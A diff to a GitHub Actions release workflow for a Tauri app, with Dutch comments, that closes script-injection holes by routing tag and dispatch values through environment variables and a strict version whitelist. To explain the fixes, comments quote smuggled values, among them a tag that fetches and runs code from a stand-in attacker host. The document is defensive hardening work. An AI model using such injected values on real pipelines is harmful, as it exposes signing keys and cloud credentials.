@@ -11,10 +11,26 @@ on:
         required: true
         default: 'v0.1.0'
 
+# Minimale default; elke job hieronder zet zelf op wat hij écht nodig heeft
+# (`contents: write` voor de jobs die de release schrijven). Zonder deze regel
+# erven jobs zonder eigen blok de repo-default.
+permissions:
+  contents: read
+
+# Bevinding O3. Bewust ÉÉN globale groep (niet per tag) en `cancel-in-progress:
+# false`: twee tags kort na elkaar beschrijven allebei dezelfde `latest.json` op
+# de release en zouden elkaars updater-entries overschrijven. Annuleren mag hier
+# al helemaal niet — een halverwege afgebroken release laat een draft met een
+# incomplete assetset achter, en de Windows-leg hangt via `needs` aan de
+# Linux/macOS-leg.
+concurrency:
+  group: release
+  cancel-in-progress: false
+
 jobs:
-  # Release-gate: ci.yml draait de poorten (tsc, testsuite, verify:examples,
-  # verify:docs), maar triggert alleen op push/PR naar `main` — een tag matcht
-  # geen van beide. Zonder deze poort wordt een tag die bovenop een commit met
+  # Release-gate: ci.yml draait de poorten (`npm run verify`), maar triggert
+  # alleen op push/PR naar `main` — een tag matcht geen van beide. Zonder deze
+  # poort wordt een tag die bovenop een commit met
   # een rode suite staat gewoon gebouwd, gesigneerd, gepubliceerd en via de
   # auto-updater naar alle bestaande installaties gepusht. De
   # versievergelijking hieronder vangt bovendien een vergeten `npm run bump`:
@@ -22,6 +38,7 @@ jobs:
   # updater gelijke versies en blijft de release voor bestaande installaties
   # STIL onzichtbaar. Bij verschil faalt deze job expliciet vóór create-release.
   gate:
+    timeout-minutes: 20
     permissions:
       contents: read
     runs-on: ubuntu-latest
@@ -38,22 +55,11 @@ jobs:
       - name: Install dependencies (npm ci)
         run: npm ci
 
-      - name: TypeScript-check (tsc --noEmit)
-        run: npx tsc --noEmit
-
-      # Vijfde poort (bevinding K10b): scripts/ en tests/ vallen buiten de hoofd-tsconfig en
-      # draaien via esbuild, dat types strip zonder controle.
-      - name: TypeScript-check scripts/ en tests/ (tsconfig.tests.json)
-        run: npx tsc --noEmit -p tsconfig.tests.json
-
-      - name: CPM/kalender-regressiesuite
-        run: bash tests/planning/run.sh
-
-      - name: Verify examples
-        run: npm run verify:examples
-
-      - name: Verify docs
-        run: npm run verify:docs
+      # Exact dezelfde poort als ci.yml en live.yml — één definitie, in
+      # package.json: typecheck (src én scripts/tests) + de vier testsuites +
+      # verify:examples + verify:docs.
+      - name: Verify (typecheck, testsuites, examples, docs)
+        run: npm run verify
 
       - name: Verify tag matches bumped version
         env:
@@ -102,6 +108,7 @@ jobs:
 
   create-release:
     needs: gate
+    timeout-minutes: 10
     permissions:
       contents: write
     runs-on: ubuntu-latest
@@ -114,12 +121,47 @@ jobs:
 
       - name: Get version
         id: get-version
+        env:
+          # Bevinding O1. Een tagnaam en een dispatch-input zijn vrije tekst;
+          # een `${{ }}` daarvan wordt LETTERLIJK in het script geplakt vóór de
+          # shell start, dus `v1.0$(...)` voert uit. Alles gaat via env.
+          # `GITHUB_EVENT_NAME`/`GITHUB_REF` zetten we hier bewust NIET: die zijn
+          # al aanwezig in de runner en de `GITHUB_`-prefix is gereserveerd.
+          INPUT_VERSION: ${{ github.event.inputs.version }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            echo "version=${{ github.event.inputs.version }}" >> $GITHUB_OUTPUT
+          set -euo pipefail
+          if [ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ]; then
+            VERSION="${INPUT_VERSION:-}"
           else
-            echo "version=${GITHUB_REF#refs/tags/}" >> $GITHUB_OUTPUT
+            VERSION="${GITHUB_REF#refs/tags/}"
           fi
+          # Whitelist die de hele injectieklasse sluit: deze waarde stroomt door
+          # naar een github-script-stap én naar het pwsh-script in de job met de
+          # signing-secrets. Twee controles, en ze zijn allebei nodig:
+          #
+          #  1. Tekenset op de HELE waarde. `case` matcht altijd de volledige
+          #     string, dus dit sluit ook een NIEUWE REGEL uit. Zonder deze stap
+          #     glipt "v1.2.3\nv9.9.9" door de regex hieronder (grep matcht per
+          #     regel) en schrijft de dispatch-input daarna een tweede regel in
+          #     $GITHUB_OUTPUT — een output-injectie. Een git-tag kan geen
+          #     nieuwe regel bevatten, een dispatch-input wél.
+          #  2. Structuur. Na stap 1 bestaat de waarde uitsluitend uit 'v',
+          #     cijfers en punten op één regel, dus is de regex sluitend.
+          #
+          # Na deze poort bevat $VERSION gegarandeerd geen teken dat in een
+          # shell, in pwsh of in JS iets betekent. (Dat het óók echte CalVer is,
+          # bewaakt de gate hierboven via de vergelijking met package.json.)
+          case "$VERSION" in
+            *[!v0-9.]*|'')
+              echo "::error::Versie bevat tekens buiten 'v', cijfers en punten (of is leeg)." >&2
+              exit 1
+              ;;
+          esac
+          if ! printf '%s' "$VERSION" | grep -qE '^v[0-9]+\.[0-9]+\.[0-9]+$'; then
+            echo "::error::Versie '$VERSION' heeft niet de vorm vX.Y.Z." >&2
+            exit 1
+          fi
+          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
 
       # De releasetekst komt uit `docs/release-notes/<tag>.md` via
       # scripts/release-notes.mjs; ontbreekt dat bestand, dan levert het script
@@ -131,6 +173,12 @@ jobs:
         id: create-release
         uses: actions/github-script@v8
         env:
+          # Bevinding O1: `'${{ ... }}'` in een script-blok breekt al op een
+          # enkele quote en plakt daarna vrije tekst als JS-broncode. Via env +
+          # process.env — hetzelfde patroon als publish-release hieronder.
+          # (`execFileSync` met een argumentenlijst is om dezelfde reden geen
+          # shell-aanroep: de versie gaat als argv-element naar node, niet door
+          # een shell heen.)
           VERSION: ${{ steps.get-version.outputs.version }}
         with:
           script: |
@@ -154,6 +202,7 @@ jobs:
 
   build-linux-mac:
     needs: create-release
+    timeout-minutes: 45
     permissions:
       contents: write
     strategy:
@@ -177,6 +226,7 @@ jobs:
         uses: actions/setup-node@v5
         with:
           node-version: 22
+          cache: 'npm'
 
       - name: Install Rust stable
         uses: dtolnay/rust-toolchain@stable
@@ -191,8 +241,12 @@ jobs:
           sudo apt-get update
           sudo apt-get install -y libwebkit2gtk-4.1-dev libappindicator3-dev librsvg2-dev patchelf
 
-      - name: Install frontend dependencies
-        run: npm install
+      # Bevinding O2: `npm ci` installeert exact wat de lockfile vastlegt en
+      # controleert de integriteitshashes — zonder dit was een gesigneerde
+      # installer niet reproduceerbaar. Er staat hier bewust GEEN rust-cache
+      # (zie ci.yml): een release bouwt uit een schone target-map.
+      - name: Install frontend dependencies (npm ci)
+        run: npm ci
 
       - name: Build Tauri app
         uses: tauri-apps/tauri-action@action-v0.6.1
@@ -205,6 +259,7 @@ jobs:
 
   build-windows:
     needs: [create-release, build-linux-mac]
+    timeout-minutes: 45
     permissions:
       contents: write
     runs-on: windows-latest
@@ -219,12 +274,14 @@ jobs:
         uses: actions/setup-node@v5
         with:
           node-version: 22
+          cache: 'npm'
 
       - name: Install Rust stable
         uses: dtolnay/rust-toolchain@stable
 
-      - name: Install frontend dependencies
-        run: npm install
+      # Bevinding O2 — zie de toelichting in build-linux-mac.
+      - name: Install frontend dependencies (npm ci)
+        run: npm ci
 
       - name: Build Tauri app
         uses: tauri-apps/tauri-action@action-v0.6.1
@@ -256,10 +313,18 @@ jobs:
         shell: pwsh
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Bevinding O1, en dit was de scherpste van de zes: pwsh evalueert
+          # `$(...)` BINNEN een double-quoted string, dus een tagnaam
+          # `v1.0$(curl attacker/x|iex)` voerde uit in precies de job die de
+          # Tauri-signing-sleutel en alle Azure-credentials in zijn env heeft.
+          # Via env leest pwsh de waarde als data, niet als broncode. De
+          # CalVer-whitelist in create-release sluit de klasse aan de bron.
+          VERSION: ${{ needs.create-release.outputs.version }}
+          REPO: ${{ github.repository }}
         run: |
           $ErrorActionPreference = 'Stop'
-          $VERSION = "${{ needs.create-release.outputs.version }}"
-          $REPO = "${{ github.repository }}"
+          $VERSION = $env:VERSION
+          $REPO = $env:REPO
           $NSIS_DIR = "$env:GITHUB_WORKSPACE/src-tauri/target/release/bundle/nsis"
 
           # --- Diagnostics: dump the nsis bundle dir so a future failure shows
@@ -355,6 +420,7 @@ jobs:
           Write-Host "Windows updater entries set to the .nsis.zip with matching signature"
 
   publish-release:
+    timeout-minutes: 10
     permissions:
       contents: write
     runs-on: ubuntu-latest
